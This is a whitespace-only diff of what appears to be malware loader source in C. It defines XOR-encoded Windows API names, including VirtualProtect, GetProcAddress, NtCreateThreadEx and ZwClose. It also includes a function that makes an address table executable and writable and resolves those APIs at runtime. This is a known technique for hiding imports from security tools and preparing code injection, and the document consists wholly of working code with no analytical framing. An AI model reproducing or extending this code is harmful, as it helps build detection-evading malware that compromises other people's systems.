@@ -4,8 +4,8 @@
 
 #include "define.h"
 
-const 
-WORD 
+const
+WORD
 ENCODED_lstrcmpiW[10] =
 {
 	0xAE7E, 0xAE61, 0xAE66, 0xAE60,
@@ -13,8 +13,8 @@ ENCODED_lstrcmpiW[10] =
 	0xAE45, 0xAE12
 };
 
-const 
-WORD 
+const
+WORD
 ENCODED_VirtualQuery[13] =
 {
 	0xAE44, 0xAE7B, 0xAE60, 0xAE66,
@@ -23,8 +23,8 @@ ENCODED_VirtualQuery[13] =
 	0xAE12
 };
 
-const 
-WORD 
+const
+WORD
 ENCODED_VirtualProtect[15] =
 {
 	0xAE44, 0xAE7B, 0xAE60, 0xAE66,
@@ -33,8 +33,8 @@ ENCODED_VirtualProtect[15] =
 	0xAE71, 0xAE66, 0xAE12
 };
 
-const 
-WORD 
+const
+WORD
 ENCODED_GetProcAddress[15] =
 {
 	0xAE55, 0xAE77, 0xAE66, 0xAE42,
@@ -177,17 +177,17 @@ ENCODED_NtCreateThreadEx[17] =
 	0xAE12
 };
 
-BOOL 
+BOOL
 DecodeEncryptedModuleNames()
 {
 	DWORD dwOld;
-	
+
 	if(!VirtualProtect((LPVOID)&g_hardAddrs, sizeof(HARDCODED_ADDRESSES), PAGE_EXECUTE_WRITECOPY, &dwOld) &&
 	   !VirtualProtect((LPVOID)&g_hardAddrs, sizeof(HARDCODED_ADDRESSES), PAGE_EXECUTE_READWRITE, &dwOld))
 		return FALSE;
-	
+
 	*(HMODULE*)_F(NTDLL_DLL) = GetModuleNTDLL();
-	
+
 	*(DWORD*)_F(lstrcmpiW            ) = (DWORD)GetFunctionFromKERNEL32(ENCODED_lstrcmpiW);
 	*(DWORD*)_F(VirtualQuery         ) = (DWORD)GetFunctionFromKERNEL32(ENCODED_VirtualQuery);
 	*(DWORD*)_F(VirtualProtect       ) = (DWORD)GetFunctionFromKERNEL32(ENCODED_VirtualProtect);
@@ -203,6 +203,6 @@ DecodeEncryptedModuleNames()
 	*(DWORD*)_F(WaitForSingleObject  ) = (DWORD)GetFunctionFromKERNEL32(ENCODED_WaitForSingleObject);
 	*(DWORD*)_F(GetExitCodeThread    ) = (DWORD)GetFunctionFromKERNEL32(ENCODED_GetExitCodeThread);
 	*(DWORD*)_F(ZwClose              ) = (DWORD)GetFunctionFromNTDLL(ENCODED_ZwClose);
-	
+
 	return TRUE;
 }
